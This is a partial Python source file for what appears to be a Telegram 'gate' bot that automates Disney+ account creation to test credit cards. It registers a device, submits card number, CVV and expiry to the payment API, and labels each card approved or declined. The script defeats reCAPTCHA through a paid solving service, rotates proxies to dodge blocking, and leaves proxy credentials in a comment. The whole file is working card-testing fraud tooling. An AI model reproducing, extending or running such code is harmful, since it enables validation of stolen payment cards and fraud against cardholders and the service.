...
class Disney:
    ...
    _ERR = {
        'formerror_notifyuser_payment': 'Se produjo un error al procesar tu pago.',
        'formerror_notifyuser_general': 'Ocurrió un problema con tu solicitud.',
        'formerror_notifyuser_binmismatch_paymentblocked': 'Método de pago no coincide con el país.',
        'FLX-0200': 'Pago no procesado — tarjeta rechazada.',
        'FLX-0226': 'Método de pago bloqueado.',
    }
    ...
    def solveRecaptcha(cap_key: str, sitekey: str, proxy=None):
        task = {'type': 'ReCaptchaV3EnterpriseTaskProxyLess',
                ...
                'websiteKey': sitekey, 'pageAction': ''}
        if proxy:
            p = proxy
            task.update({
                'type': 'ReCaptchaV3EnterpriseTask',
                'proxyType': 'http',
                'proxyAddress': p.split('@')[1].split(':')[0] if '@' in p else p.split(':')[0],
                'proxyPort': int(p.split('@')[1].split(':')[1]) if '@' in p else int(p.split(':')[1]),
                'proxyLogin': p.split(':')[0] if '@' in p else '',
                'proxyPassword': p.split(':')[1].split('@')[0] if '@' in p else '',
            })
        try:
            r = curl.post('https://api.capsolver.com/createTask',
                          json={'clientKey': cap_key, 'task': task}, timeout=20).json()
            if r.get('errorId', 1) != 0:
                return None
            tid = r['taskId']
            for _ in range(60):
                time.sleep(3)
                r2 = curl.post('https://api.capsolver.com/getTaskResult',
                               json={'clientKey': cap_key, 'taskId': tid}, timeout=15).json()
    ...
    def buildBillingResponse(card: dict, resp: dict, data: types.SimpleNamespace) -> dict:
        ...
        try:
            ...
            if d.get('success'):
                return {'status': True, 'success': True, 'card': card_str,
                        'response': 'Approved', 'apiResponse': 'Approved ✅',
                        'email': data.mail, 'password': data.password}
            msg = ''
            try:
            ...
            return {'status': True, 'success': False, 'card': card_str,
                    'response': msg or Disney._resolve('', error_code),
                    'apiResponse': 'Declined ❌', 'email': data.mail, 'password': data.password}
        except Exception:
            return {'status': True, 'success': False, 'card': card_str,
                    'response': 'ParseError', 'apiResponse': 'Unknown ⚠️',
                    'email': data.mail, 'password': data.password}
...
def processDisneyFlow(cardInput: str, proxy=None, capsolver_key: str = '', retries: int = 0) -> dict:
    ...
    # model.proxies = {
    #     'http': 'http://b4ab6bbd7b83fecd-geo-us:7ad3a6559050089d@gate-eu.vaultproxies.com:80',
    #     'https': 'http://b4ab6bbd7b83fecd-geo-us:7ad3a6559050089d@gate-eu.vaultproxies.com:80',
    # }
    ...
    try:
        ...
        headers1a = {
            ...
            'authorization': f'Bearer {Disney.SDK_API_KEY}', 'content-type': 'application/json',
            'origin': 'https://www.disneyplus.com', 'referer': 'https://www.disneyplus.com/',
            'user-agent': Disney._UA, 'x-application-version': Disney.APP_VERSION,
            'x-bamsdk-client-id': Disney.CLIENT_ID, 'x-bamsdk-platform': Disney.SDK_PLATFORM,
            'x-bamsdk-platform-id': 'browser', 'x-bamsdk-version': Disney.SDK_VERSION,
            'x-dss-edge-accept': 'vnd.dss.edge+json; version=2',
            'x-request-yp-id': Disney.YP_ID, 'x-request-id': Disney.uuid(),
        }
        payload1a = {
            'operationName': 'RegisterDevice',
            'query': 'mutation RegisterDevice($registerDevice: RegisterDeviceInput!) { registerDevice(registerDevice: $registerDevice) { grant { assertion grantType } } }',
            'variables': {'registerDevice': {'deviceFamily': 'browser', 'applicationRuntime': 'firefox', 'deviceProfile': 'macosx', 'deviceLanguage': 'es', 'attributes': {'osDeviceIds': [], 'manufacturer': 'unknown', 'model': 'unknown', 'operatingSystem': 'macosx', 'operatingSystemVersion': 'unknown'}}},
        }
        ...
        payload1b = {
            ...
            'query': 'mutation exchangeDeviceGrantForAccessToken($input: ExchangeDeviceGrantForAccessTokenInput!) { exchangeDeviceGrantForAccessToken(exchangeDeviceGrantForAccessToken: $input) { accepted } }',
            'variables': {'input': {'deviceGrant': assertion}},
        }
        ...
        if not anon_token:
            ...
            payload1b_f = (f'grant_type={_q("urn:ietf:params:oauth:grant-type:token-exchange")}'
                           f'&subject_token={_q(assertion)}'
                           f'&subject_token_type={_q("urn:bamtech:params:oauth:token-type:device")}'
                           f'&platform=browser')
        ...
        payload3 = {
            ...
            'variables': {
                'input': {
                    'attributes': {
                        'languagePreferences': {
                            'appLanguage': Disney.LANGUAGE,
                            'playbackLanguage': Disney.LANGUAGE,
                            'subtitleLanguage': Disney.LANGUAGE,
                        },
                        'legalAssertions': [
                            Disney.LEGAL_ASSERT,
                        ],
        ...
        try:
            ...
            headers3b = {'accept': 'application/json', 'content-type': 'application/json',
                         'origin': 'https://www.disneyplus.com', 'referer': 'https://www.disneyplus.com/',
                         'user-agent': Disney._UA}
            payload3b = {
                'query': 'mutation registerIdentityDevice($registerIdentityDeviceRequest: RegisterIdentityDeviceRequestInput!) { registerIdentityDevice(registerIdentityDeviceRequest: $registerIdentityDeviceRequest) { identityDevice { deviceId archived brand createdAt expiresAt } } }',
                'variables': {'registerIdentityDeviceRequest': {'clientId': Disney.IDENTITY_CLIENT_ID, 'deviceId': identity_device_id, 'metadata': {'isTest': False}}},
            }
        ...
        payload4 = {
            'operationName': 'createMarketingPreferences',
            'query': 'mutation createMarketingPreferences($input: CreateMarketingPreferencesInput!) { createMarketingPreferences(createMarketingPreferences: $input) { accepted } }',
            'variables': {'input': {'email': data.mail, 'legalAssertions': [Disney.LEGAL_ASSERT], 'subscribed': True, 'marketingPreferences': ['DisneyPlus', 'WaltDisneyFamily'], 'preferredLanguages': [Disney.LANGUAGE], 'metadata': {'isTest': False}}},
        }
        ...
        payload6 = {
            'creditCardNumber': card['number'], 'namespaceId': 100,
            'passthroughData': {
                'alternateName': 'Disney Subscription Card',
                'billingAddress': {'country': Disney.COUNTRY},
                'cvv': card['cvv'], 'expiryMonth': int(card['month']), 'expiryYear': int(card['year']),
                'isDefault': True, 'isReusable': True, 'isShared': True,
                'ownerFullName': f'{data.fn} {data.ln}', 'usage': 'multi_use',
            },
        }
        ...
        payload8 = {
            'offers': [{'campaignId': campaign_id, 'offerId': offer_id}],
            'paymentMethodId': payment_method_id,
            'paymentMethod': {'type': 'creditCard', 'paymentMethodId': payment_method_id, 'isTemplatized': False},
            'recaptchaToken': cap, 'ravelinDeviceId': ravelin_id,
            'hasPostSufAddonExperience': False,
        }
        ...
        return {'status': False, 'message': f'[{_step}] {e}',
...
def gateCmd(bot, update, gestion):
    def _checker_p(cc, binData):
        _DEAD = ('CONNECT aborted', 'CONNECT tunnel', '407', 'timed out', 'Connection refused')
        for _ in range(3):
            proxy_dict = gestion.proxy()
            proxy = list(proxy_dict.values())[0].replace('http://', '') if proxy_dict else None
            r = _checker(cc, binData, proxy=proxy)
            if r.get('status') or not any(d in r.get('raise', '') for d in _DEAD):
                return r
        return _checker(cc, binData, proxy=None)
    run_gate(bot, update, gestion, gateway=_GATEWAY, checker=_checker_p)
